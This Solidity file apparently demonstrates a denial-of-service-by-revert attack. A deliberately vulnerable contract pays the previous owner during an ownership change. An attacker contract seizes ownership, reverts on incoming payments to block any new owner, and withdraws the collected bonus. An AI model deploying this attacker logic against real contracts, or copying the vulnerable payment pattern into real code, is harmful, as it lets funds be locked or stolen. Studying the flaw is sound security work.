// SPDX-License-Identifier: MIT
import "hardhat/console.sol";

pragma solidity 0.8.18;

contract RevertVictim {
    address public owner;
    uint256 public changeOwnerFee = 10 ether;
    uint256 public playFee = 0.1 ether;
    uint256 public bonus;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not owner");
        _;
    }

    function changeOwner() external payable {
        require(msg.value == changeOwnerFee);
        if (owner != address(0)) {
            (bool success, ) = owner.call{value: changeOwnerFee}(""); //attack of here
            require(success, "change fail");
        }
        owner = msg.sender;
    }

    function playgame() external payable {
        require(msg.value == playFee, "not enough eth to play");
        bonus += msg.value;
        //do something
        //...
    }

    function withdrawBonus() external onlyOwner {
        require(bonus > 0, "not enough eth to withdraw");
        uint256 currentBonus = bonus;
        bonus = 0;
        (bool success, ) = owner.call{value: currentBonus}("");
        require(success, "withdraw bonus fail");
    }
}

contract RevertAttacker {
    RevertVictim private victim;
    address public owner;

    error Fail();

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not owner");
        _;
    }

    // step 1: identify the victim
    constructor(address _victim) {
        victim = RevertVictim(_victim);
        owner = msg.sender;
    }

    // step 2: change victim's owner to this contract
    function changeOwner() external payable onlyOwner {
        victim.changeOwner{value: msg.value}();
    }

    // step 3: do anything to victim contract like withdrawBonus function or more
    function withdrawBonus() external onlyOwner {
        victim.withdrawBonus();
    }

    receive() external payable {
        if (tx.origin != owner) {
            revert Fail(); //prevent victim change owner when anyone call changeOwer from victim contract
        }
        (bool success, ) = owner.call{value: msg.value}("");
        require(success, "withdraw bonus fail");
    }
}
